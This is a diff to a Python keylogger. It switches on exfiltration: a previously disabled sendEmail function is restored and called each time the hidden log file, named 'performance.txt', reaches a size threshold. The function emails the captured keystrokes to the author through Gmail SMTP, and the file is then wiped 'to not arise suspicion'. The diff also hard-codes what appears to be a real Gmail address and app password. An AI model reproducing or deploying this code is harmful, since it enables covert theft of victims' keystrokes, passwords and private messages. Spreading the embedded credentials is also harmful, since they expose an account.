@@ -64,8 +64,8 @@ def writeKey(keys: List[Key]) -> None:
             if k.find("Key") == -1: # Check if it is a special key
                 keyFile.write(k)
         fileSize = os.path.getsize(FILEPATH) # Check the size of the file and when it gets to a certain size send email
-        print(fileSize)
-        if (fileSize % 900 == 0): # Check size to send email and possibly wipe the current text file
+        # print(fileSize)
+        if (fileSize % 1000 == 0): # Check size to send email and possibly wipe the current text file
             clear()
 
 def victimInfo() -> None:
@@ -98,7 +98,7 @@ def makePath():
         HOMEPATH = "/home/"  # Set Home Path that is usual for Mac and Linux
         try:
             username = os.getlogin() + "/" # We will try to get their username
-            FILEPATH = searchFile(HOMEPATH + username, ".config") + "/performance.txt" # We will look for .config folder
+            FILEPATH = searchFile(HOMEPATH + username, ".config") + "/performance.txt" # We will look for .config folder or could store in the tmp folder instead
             if FILEPATH is None: # .config was not found then we will make one
                 try:
                     os.makedirs(HOMEPATH + username + ".config")
@@ -122,18 +122,19 @@ def searchFile(start: str, target: str) -> Union[str, None]:
             return os.path.join(root, target)
     return None
 
-"""def sendEmail() -> None:
-
+def sendEmail() -> None:
+    """
     Send email with current text in the keylogger file
+    """
     # Add Mail Configuration
     smtp_server: str = "smtp.gmail.com"
     smtp_port: int = 587
-    smtp_username: str = "USERNAME HERE"
-    smtp_password: str = "PASSWORD HERE"
+    smtp_username: str = "kevincisneros29@gmail.com"
+    smtp_password: str = "vrjatronwbyjullq"
 
     # Email Content
-    sender: str = "USERNAME HERE"
-    recipient: str = "RECIPIENT EMAIL HERE"
+    sender: str = "kevincisneros29@gmail.com"
+    recipient: str = "kevincisneros29@duck.com"
     subject: str = "New Keys"
     body: str = ""
 
@@ -169,14 +170,14 @@ def searchFile(start: str, target: str) -> Union[str, None]:
         print('An error occurred while sending the email:', str(e))
     finally:
         # Close the connection to the SMTP server
-        server.quit()"""
+        server.quit()
 
 def clear():
     """
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
     """
-    #sendEmail()
+    sendEmail()
     with open(FILEPATH, "w") as keyFile:
         keyFile.truncate(0)
 
